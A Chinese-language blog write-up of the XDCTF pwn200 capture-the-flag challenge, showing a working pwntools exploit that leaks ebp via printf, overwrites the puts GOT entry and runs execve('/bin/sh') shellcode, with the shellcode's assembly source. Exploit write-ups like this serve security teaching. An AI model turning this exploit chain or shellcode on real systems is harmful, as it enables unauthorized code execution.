---
title: xdctf-pwn200 
date: 2017-04-08 18:09:04
tags:
- 栈
- pwn
- ctf
---
XDCTF (哪一年的忘了)中的一道pwn题题目地址http://pan.baidu.com/s/1hszHtwo解题思路：缓冲区溢出->泄露ebp->覆盖got表->执行shellcode首先用ida分析这题的反汇编：这里是一个关键的缓冲区溢出点，这里虽然v2的长度和读入的最大长度一致，但是我们知道对于printf函数，如果后面的地址中（这里是v2的栈地址）的内容没有”/x00”这样的结束符，就会
<!-- more -->
### XDCTF (哪一年的忘了)中的一道pwn题
#### 解题思路：缓冲区溢出->泄露ebp->覆盖got表->执行shellcode
首先用ida分析这题的反汇编：

这里是一个关键的缓冲区溢出点，这里虽然v2的长度和读入的最大长度一致，但是我们知道对于printf函数，如果后面的地址中（这里是v2的栈地址）的内容没有”/x00”这样的结束符，就会一直打印下去，这样我们只要输入0x40个不为0的字符，就可以泄露出main函数的ebp值，通过main函数的ebp可以计算出任意函数的ebp：
~~~
from pwn import *
io = process("./pwn200")

payload1 = "a" * 0x30

io.recvuntil(" are u?\n")

io.send(payload1) # leak the ebp of main

t =io.recvline()[48:54] + '\x00\x00' #获取main函数ebp地址

x = hex(u64(t))

main_ebp_addr = int(x,16)
~~~

接下来进入return 后面的那个函数中，观察到dest的指针可以被覆盖，再结合后面的strcpy函数，我们知道我们可以对任意地址执行写操作：

于是我们选择覆盖puts函数的got表为我们可控的buf的栈上地址，这个地址可以通过之前得到的main_ebp_addr:
~~~
new_ebp = main_ebp_addr - 0x10 - 0x10 - 0x58 - 0x08  #当前函数的栈底

shellcode_addr = new_ebp - 0x40 + 0x10  #计算shellcode的首地址
~~~

接下来就是构造shellcode和查找got表中puts的地址，就可以拿shell了：
~~~
puts_got = 0x602028 #cover dest      
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05"
junk = "a" * (0x40 - 0x10 - 0x8 - len(shellcode))
payload2 = p64(shellcode_addr)+p64(0)+ shellcode + junk + p64(puts_got)
io.recvline()
io.sendline('0')
io.recvline()
io.send(payload2)
io.interactive()
~~~
~~~
section .text
global _start
_start:
xor rdi,rdi
xor rsi,rsi
xor rdx,rdx
mov rbx,68732f6e69622fH
push rbx
mov rdi,rsp
mov rax,59
syscall
~~~

上述代码用：
~~~
nasm -f elf64 shellcode.asm 
~~~

编译成shellcode.o文件后，再用：
~~~
 objdump -d shellcode.o
~~~

得到二进制代码：
~~~
0000000000000000 <_start>:
   0:   48 31 ff                xor    %rdi,%rdi
   3:   48 31 f6                xor    %rsi,%rsi
   6:   48 31 d2                xor    %rdx,%rdx
   9:   48 bb 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rbx
  10:   73 68 00 
  13:   53                      push   %rbx
  14:   48 89 e7                mov    %rsp,%rdi
  17:   b8 3b 00 00 00          mov    $0x3b,%eax
  1c:   0f 05                   syscall 
~~~

于是得到shellcode
